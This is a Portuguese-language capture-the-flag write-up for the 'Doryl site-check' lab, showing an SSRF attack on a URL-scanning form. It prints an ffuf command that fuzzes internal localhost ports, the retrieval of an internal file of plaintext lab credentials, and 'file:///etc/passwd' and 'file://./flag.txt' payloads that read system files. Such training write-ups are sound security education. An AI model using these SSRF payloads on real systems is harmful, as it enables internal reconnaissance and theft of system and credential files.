---
title: "Write Up - Doryl Site-Check"
summary: "Resolução do desafio Doryl site-check "
tags: ["CTF", "Hack the Box"]
# externalUrl: ""
date: 2024-09-05
draft: false
showAuthor: false
authors:
- edson
showAuthorsBadges: false
---

# CTF Doryl

### Como acessar o desafio:
- Acesse o https://github.com/fguisso/doryl-site-check, e inicie o desafio na sua máquina. No caso foi entregue a versão na branch `Internal`.

### Descrição
O Desafio tem como objetivos:
-   Encontrar um arquivo com informações muito sensiveis.
-   Encontrar uma flag no formato secDevOps{.....}

### Como Funciona a Aplicação
- A aplicação possui apenas um campo de entrada, utilizado para escanear a url inserida:

![aplicacao](https://i.imgur.com/ilyYRAt.png)
-Note que ele retorna a resposta completa da url que o usuário inseriu.

![print_resposta_aplicacao](https://i.imgur.com/g71XYNY.png)
Então parece que a aplicação internamente envia requisições para a url. Nesse princípio é possível inserir uma URL para tentar acessar servidores internos, como o `http://localhost`.

- Utilize as portas web mais utilizadas em um bruteforce, para saber se existe alguma porta interna aberta: `80,443,8009,8180,81,300,591,593,832,981,1010,1311,2082,2087,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,12443,16080,18091,18092,20720,28017`.

- Utilize o ffuf para automatizar a buscar de portas o input é enviado no parâmetro `target` para o servidor, e note que filtrei as respostas que possuem 3246 palavras que considerei como resposta padrão do site.

`ffuf -u http://0.0.0.0:8080/check -X POST -d "target=http%3A%2F%2Flocalhost%3AFUZZ" -w ports.txt -H 'Content-Type: application/x-www-form-urlencoded' -fw 3246`

![print_ffuf_aplicacao](https://i.imgur.com/1eJAAko.png)
- Note que ele encontrou apenas 2 portas abertas a 8080, que fornece o site principal, e a 3000, que fornece uma aplicação interna.
- Analise a resposta completa, quando você insere http://localhost:3000,
```
GET http://localhost:3000
Content-Length: 93   
Content-Type: text/html; charset=utf-8   
Date: Thu, 05 Sep 2024 05:46:30 GMT   
Last-Modified: Thu, 05 Sep 2024 01:48:03 GMT   
<pre>
<a href="employers.html">employers.html</a>
<a href="logins.txt">logins.txt</a>
</pre>
```
- Note que ele possui um link para `logins.txt`, ao enviar a url http://localhost:3000/logins.txt no input, ele irá retornar informações muito sensíveis.
```
GET http://localhost:3000/logins.txt
Accept-Ranges: bytes   
Content-Length: 233   
Content-Type: text/plain; charset=utf-8   
Date: Thu, 05 Sep 2024 05:50:52 GMT   
Last-Modified: Thu, 05 Sep 2024 01:48:03 GMT   
// Super sensitive information

// WiFi
id: Doryl
password: 2022doryl@*

// Guest WiFi
id: Doryl-Guest
password: dorylguest2022

// Intranet
login: admin
password: Adminqwert2022

// Ginpass
login: dorylAdmin
password: ginAndOrange
```
#### Primeira Etapa Concluída
### Encontre a FLAG
- Note, o servidor envia um request interno para a url inserida, que utilizou o protocolo `http`. Ao saber disso podemos tentar outros protocolos comuns para acessar arquivos de um servidor interno, como o `file`
- Vamos tentar recuperar um arquivo comum em servidores linux `/etc/passwd` para testar se ele retornar o conteúdo, insira no input `file:///etc/passwd`.
```
GET file:///etc/passwd

root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
```
- Essa resposta, é o conteúdo do `/etc/passwd` , então podemos tentar recuperar a flag que está armazenada no sistema. É comum em ctfs a flag ficar na mesma pasta do desafio e com o  nome `flag.txt` , partindo deste princípio podemos inserir `file://./flag.txt` .
```
GET file://./flag.txt

SecDevOps{SSRF_3_UM_PERIGOnvim .!}
```
Todos Objetivos foram concluidos ( ;

|Criador do Desafio: https://github.com/fguisso
